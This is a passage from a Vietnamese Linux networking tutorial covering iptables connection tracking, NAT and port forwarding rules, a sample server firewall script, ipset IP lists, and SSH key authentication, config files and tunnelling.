</span></span><span class=line><span class=cl>Lookup: O(1) average
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ví dụ:
</span></span><span class=line><span class=cl>Client 192.168.1.100:54321 → Server 1.2.3.4:80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>conntrack entry:
</span></span><span class=line><span class=cl>┌────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│ tcp  192.168.1.100:54321 → 1.2.3.4:80  ESTABLISHED         │
</span></span><span class=line><span class=cl>└────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Reply packet 1.2.3.4:80 → 192.168.1.100:54321:
</span></span><span class=line><span class=cl><span class=k>-</span> Lookup conntrack table → Found!
</span></span><span class=line><span class=cl><span class=k>-</span> State = ESTABLISHED
</span></span><span class=line><span class=cl><span class=k>-</span> Rule &#34;-m state --state ESTABLISHED&#34; match
</span></span><span class=line><span class=cl>- ACCEPT mà không cần rule riêng cho reply</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Xem conntrack table</span>
</span></span><span class=line><span class=cl>conntrack -L
</span></span><span class=line><span class=cl>cat /proc/net/nf_conntrack
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Stateful firewall pattern:</span>
</span></span><span class=line><span class=cl><span class=c1># Cho phép established/related, chỉ filter NEW</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
</span></span><span class=line><span class=cl>iptables -A INPUT -m state --state NEW -p tcp --dport <span class=m>22</span> -j ACCEPT
</span></span><span class=line><span class=cl>iptables -A INPUT -m state --state NEW -p tcp --dport <span class=m>80</span> -j ACCEPT
</span></span><span class=line><span class=cl>iptables -A INPUT -j DROP</span></span></code></pre></div><h3 class=heading-element id=37-nat-network-address-translation><span>3.7 NAT (Network Address Translation)</span>
<a href=#37-nat-network-address-translation class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                       SNAT / MASQUERADE                     │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Internal Network              NAT Gateway              Internet
</span></span><span class=line><span class=cl>192.168.1.0/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>192.168.1.100 ────► 192.168.1.1 ────────────────────► 8.8.8.8
</span></span><span class=line><span class=cl>src: 192.168.1.100           │ SNAT: src → 203.0.113.1
</span></span><span class=line><span class=cl>dst: 8.8.8.8                 │
</span></span><span class=line><span class=cl>                             │
</span></span><span class=line><span class=cl>192.168.1.100 ◄──── 192.168.1.1 ◄──────────────────── 8.8.8.8
</span></span><span class=line><span class=cl>                             │ Reverse NAT (auto by conntrack)</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># SNAT (static external IP)</span>
</span></span><span class=line><span class=cl>iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 203.0.113.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># MASQUERADE (dynamic external IP, như PPPoE)</span>
</span></span><span class=line><span class=cl>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Enable IP forwarding</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>1</span> &gt; /proc/sys/net/ipv4/ip_forward
</span></span><span class=line><span class=cl><span class=c1># Hoặc persistent trong /etc/sysctl.conf:</span>
</span></span><span class=line><span class=cl><span class=c1># net.ipv4.ip_forward = 1</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                         DNAT                                │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Internet ────► Gateway (203.0.113.1:80) ────► Internal Server
</span></span><span class=line><span class=cl>                                              (192.168.1.100:80)
</span></span><span class=line><span class=cl>               │
</span></span><span class=line><span class=cl>               │ DNAT: dst → 192.168.1.100:80
</span></span><span class=line><span class=cl>               │</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># DNAT (Port forwarding)</span>
</span></span><span class=line><span class=cl>iptables -t nat -A PREROUTING -i eth0 -p tcp --dport <span class=m>80</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>         -j DNAT --to-destination 192.168.1.100:80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cần thêm FORWARD rule</span>
</span></span><span class=line><span class=cl>iptables -A FORWARD -p tcp -d 192.168.1.100 --dport <span class=m>80</span> -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># REDIRECT (local port redirection)</span>
</span></span><span class=line><span class=cl>iptables -t nat -A PREROUTING -p tcp --dport <span class=m>80</span> -j REDIRECT --to-port <span class=m>8080</span></span></span></code></pre></div><h3 class=heading-element id=38-ví-dụ-thực-tế><span>3.8 Ví Dụ Thực Tế</span>
<a href=#38-v%c3%ad-d%e1%bb%a5-th%e1%bb%b1c-t%e1%ba%bf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># Basic server firewall</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Flush existing rules</span>
</span></span><span class=line><span class=cl>iptables -F
</span></span><span class=line><span class=cl>iptables -X
</span></span><span class=line><span class=cl>iptables -t nat -F
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Default policies</span>
</span></span><span class=line><span class=cl>iptables -P INPUT DROP
</span></span><span class=line><span class=cl>iptables -P FORWARD DROP
</span></span><span class=line><span class=cl>iptables -P OUTPUT ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow loopback</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -i lo -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow established connections</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow SSH (rate limited)</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -p tcp --dport <span class=m>22</span> -m state --state NEW <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>         -m limit --limit 3/minute --limit-burst <span class=m>5</span> -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow HTTP/HTTPS</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -p tcp -m multiport --dports 80,443 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>         -m state --state NEW -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow ping (limited)</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -p icmp --icmp-type echo-request <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>         -m limit --limit 1/second -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Log dropped packets</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -j LOG --log-prefix <span class=s2>&#34;IPT DROP: &#34;</span> --log-level <span class=m>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Drop everything else (implicit by policy, but explicit for clarity)</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -j DROP
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Save rules</span>
</span></span><span class=line><span class=cl>iptables-save &gt; /etc/iptables/rules.v4</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># NAT router setup</span>
</span></span><span class=line><span class=cl><span class=c1># eth0 = WAN (external)</span>
</span></span><span class=line><span class=cl><span class=c1># eth1 = LAN (internal 192.168.1.0/24)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Enable forwarding</span>
</span></span><span class=line><span class=cl>sysctl -w net.ipv4.ip_forward<span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NAT for LAN</span>
</span></span><span class=line><span class=cl>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Allow forwarding</span>
</span></span><span class=line><span class=cl>iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
</span></span><span class=line><span class=cl>iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Port forward 80 to internal web server</span>
</span></span><span class=line><span class=cl>iptables -t nat -A PREROUTING -i eth0 -p tcp --dport <span class=m>80</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>         -j DNAT --to-destination 192.168.1.100:80
</span></span><span class=line><span class=cl>iptables -A FORWARD -p tcp -d 192.168.1.100 --dport <span class=m>80</span> -j ACCEPT</span></span></code></pre></div><h3 class=heading-element id=39-ipset---efficient-ip-lists><span>3.9 ipset - Efficient IP Lists</span>
<a href=#39-ipset---efficient-ip-lists class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ipset dùng hash table → O(1) lookup</span>
</span></span><span class=line><span class=cl><span class=c1># Thay vì nhiều rules → 1 rule với ipset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo ipset</span>
</span></span><span class=line><span class=cl>ipset create blacklist hash:ip
</span></span><span class=line><span class=cl>ipset create whitelist hash:net    <span class=c1># Cho network</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm IP</span>
</span></span><span class=line><span class=cl>ipset add blacklist 1.2.3.4
</span></span><span class=line><span class=cl>ipset add blacklist 5.6.7.8
</span></span><span class=line><span class=cl>ipset add whitelist 10.0.0.0/8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem ipset</span>
</span></span><span class=line><span class=cl>ipset list blacklist
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Dùng trong iptables</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -m <span class=nb>set</span> --match-set blacklist src -j DROP
</span></span><span class=line><span class=cl>iptables -A INPUT -m <span class=nb>set</span> --match-set whitelist src -j ACCEPT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Performance: 10000 IPs</span>
</span></span><span class=line><span class=cl><span class=c1># Với iptables rules: O(10000) per packet</span>
</span></span><span class=line><span class=cl><span class=c1># Với ipset: O(1) per packet</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Auto-expire entries</span>
</span></span><span class=line><span class=cl>ipset create tempblock hash:ip timeout <span class=m>3600</span>
</span></span><span class=line><span class=cl>ipset add tempblock 1.2.3.4          <span class=c1># Tự xóa sau 1 giờ</span>
</span></span><span class=line><span class=cl>ipset add tempblock 5.6.7.8 timeout <span class=m>7200</span>  <span class=c1># Override: 2 giờ</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-4-ssh---secure-shell><span>PHẦN 4: SSH - SECURE SHELL</span>
<a href=#ph%e1%ba%a7n-4-ssh---secure-shell class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=41-ssh-architecture><span>4.1 SSH Architecture</span>
<a href=#41-ssh-architecture class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                   SSH PROTOCOL STACK                        │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                  SSH Connection Layer                       │
</span></span><span class=line><span class=cl>│         (channels, port forwarding, X11)                    │
</span></span><span class=line><span class=cl>├─────────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│                SSH Authentication Layer                     │
</span></span><span class=line><span class=cl>│           (password, publickey, keyboard)                   │
</span></span><span class=line><span class=cl>├─────────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│                 SSH Transport Layer                         │
</span></span><span class=line><span class=cl>│  (key exchange, encryption, integrity, compression)         │
</span></span><span class=line><span class=cl>├─────────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│                        TCP                                  │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Key Exchange (Diffie-Hellman):
</span></span><span class=line><span class=cl><span class=k>-</span> Cho phép 2 bên tạo shared secret qua insecure channel
</span></span><span class=line><span class=cl><span class=k>-</span> Không ai giữa đường biết được secret
</span></span><span class=line><span class=cl><span class=k>-</span> Complexity: Dựa trên discrete logarithm problem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Encryption Algorithms:
</span></span><span class=line><span class=cl><span class=k>-</span> AES-256-GCM (recommended)
</span></span><span class=line><span class=cl><span class=k>-</span> ChaCha20-Poly1305 (fast on mobile)
</span></span><span class=line><span class=cl><span class=k>-</span> AES-128-CTR, AES-256-CTR
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MAC (Message Authentication Code):
</span></span><span class=line><span class=cl><span class=k>-</span> HMAC-SHA2-256, HMAC-SHA2-512
</span></span><span class=line><span class=cl>- Đảm bảo integrity và authenticity</span></span></code></pre></div><h3 class=heading-element id=42-key-based-authentication><span>4.2 Key-Based Authentication</span>
<a href=#42-key-based-authentication class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             PUBLIC KEY AUTHENTICATION                       │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Asymmetric Cryptography:
</span></span><span class=line><span class=cl><span class=k>-</span> Private key: Giữ bí mật, KHÔNG CHIA SẺ
</span></span><span class=line><span class=cl><span class=k>-</span> Public key: Có thể share thoải mái
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Authentication flow:
</span></span><span class=line><span class=cl><span class=k>1.</span> Client gửi public key ID
</span></span><span class=line><span class=cl><span class=k>2.</span> Server check authorized_keys, tìm thấy public key
</span></span><span class=line><span class=cl><span class=k>3.</span> Server tạo random challenge, encrypt với public key
</span></span><span class=line><span class=cl><span class=k>4.</span> Gửi encrypted challenge cho client
</span></span><span class=line><span class=cl><span class=k>5.</span> Client decrypt bằng private key, gửi response
</span></span><span class=line><span class=cl><span class=k>6.</span> Server verify response → Authentication success
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thuật toán:
</span></span><span class=line><span class=cl><span class=k>-</span> RSA: Dựa trên factorization problem, key 4096-bit
</span></span><span class=line><span class=cl><span class=k>-</span> Ed25519: Elliptic curve, key nhỏ hơn, nhanh hơn (recommended)
</span></span><span class=line><span class=cl>- ECDSA: Elliptic curve, nhưng có concerns về implementation</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Tạo key pair</span>
</span></span><span class=line><span class=cl>ssh-keygen -t ed25519 -C <span class=s2>&#34;your_email@example.com&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Tạo: ~/.ssh/id_ed25519 (private) và ~/.ssh/id_ed25519.pub (public)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># RSA (nếu cần compatibility)</span>
</span></span><span class=line><span class=cl>ssh-keygen -t rsa -b <span class=m>4096</span> -C <span class=s2>&#34;your_email@example.com&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Copy public key lên server</span>
</span></span><span class=line><span class=cl>ssh-copy-id user@server
</span></span><span class=line><span class=cl><span class=c1># Hoặc manually:</span>
</span></span><span class=line><span class=cl>cat ~/.ssh/id_ed25519.pub <span class=p>|</span> ssh user@server <span class=s1>&#39;cat &gt;&gt; ~/.ssh/authorized_keys&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SSH với specific key</span>
</span></span><span class=line><span class=cl>ssh -i ~/.ssh/custom_key user@server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SSH agent (không phải nhập passphrase mỗi lần)</span>
</span></span><span class=line><span class=cl><span class=nb>eval</span> <span class=s2>&#34;</span><span class=k>$(</span>ssh-agent -s<span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>ssh-add ~/.ssh/id_ed25519
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># List keys trong agent</span>
</span></span><span class=line><span class=cl>ssh-add -l</span></span></code></pre></div><h3 class=heading-element id=43-ssh-config-file><span>4.3 SSH Config File</span>
<a href=#43-ssh-config-file class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ~/.ssh/config</span>
</span></span><span class=line><span class=cl><span class=c1># Định nghĩa shortcuts và defaults</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host myserver
</span></span><span class=line><span class=cl>    HostName 192.168.1.100
</span></span><span class=line><span class=cl>    User admin
</span></span><span class=line><span class=cl>    Port <span class=m>2222</span>
</span></span><span class=line><span class=cl>    IdentityFile ~/.ssh/myserver_key
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host *.internal.company.com
</span></span><span class=line><span class=cl>    User deploy
</span></span><span class=line><span class=cl>    ProxyJump bastion
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host bastion
</span></span><span class=line><span class=cl>    HostName bastion.company.com
</span></span><span class=line><span class=cl>    User admin
</span></span><span class=line><span class=cl>    IdentityFile ~/.ssh/bastion_key
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host *
</span></span><span class=line><span class=cl>    ServerAliveInterval <span class=m>60</span>
</span></span><span class=line><span class=cl>    ServerAliveCountMax <span class=m>3</span>
</span></span><span class=line><span class=cl>    AddKeysToAgent yes
</span></span><span class=line><span class=cl>    IdentitiesOnly yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sử dụng:</span>
</span></span><span class=line><span class=cl>ssh myserver                    <span class=c1># = ssh -p 2222 admin@192.168.1.100</span>
</span></span><span class=line><span class=cl>ssh app.internal.company.com    <span class=c1># Qua bastion</span></span></span></code></pre></div><h3 class=heading-element id=44-port-forwarding-tunneling><span>4.4 Port Forwarding (Tunneling)</span>
<a href=#44-port-forwarding-tunneling class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              LOCAL PORT FORWARDING (-L)                     │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Truy cập remote service qua local port
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Local Machine          SSH Server           Target Server
</span></span><span class=line><span class=cl>localhost:8080 ──────► server ────────────► target:3306
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ssh -L 8080:target:3306 user<span class=ni>@server</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ứng dụng: Truy cập database sau firewall
</span></span><span class=line><span class=cl>mysql -h 127.0.0.1 -P 8080    # Connect qua tunnel</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             REMOTE PORT FORWARDING (-R)                     │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Expose local service ra remote
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Local Machine          SSH Server           Internet
</span></span><span class=line><span class=cl>localhost:80 ◄──────── server:8080 ◄─────── users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ssh -R 8080:localhost:80 user<span class=ni>@server</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ứng dụng: Demo localhost cho người khác xem
</span></span><span class=line><span class=cl>(Cần GatewayPorts yes trên server)</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                 DYNAMIC FORWARDING (-D)                     │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SOCKS proxy qua SSH
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Local Machine                    SSH Server
</span></span><span class=line><span class=cl>SOCKS5 :1080 ──────────────────► server ──────► Internet
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ssh -D 1080 user<span class=ni>@server</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Browser config:
</span></span><span class=line><span class=cl>SOCKS5 proxy: 127.0.0.1:1080
</span></span><span class=line><span class=cl>→ Tất cả traffic đi qua SSH tunnel</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Local forward: Access remote MySQL locally</span>
</span></span><span class=line><span class=cl>ssh -L 3306:localhost:3306 user@db-server
</span></span><span class=line><span class=cl>ssh -L 3306:db-internal:3306 user@bastion    <span class=c1># DB không public</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remote forward: Expose local web server</span>
</span></span><span class=line><span class=cl>ssh -R 8080:localhost:80 user@public-server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Dynamic (SOCKS proxy)</span>
</span></span><span class=line><span class=cl>ssh -D <span class=m>1080</span> user@server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Multiple forwards</span>
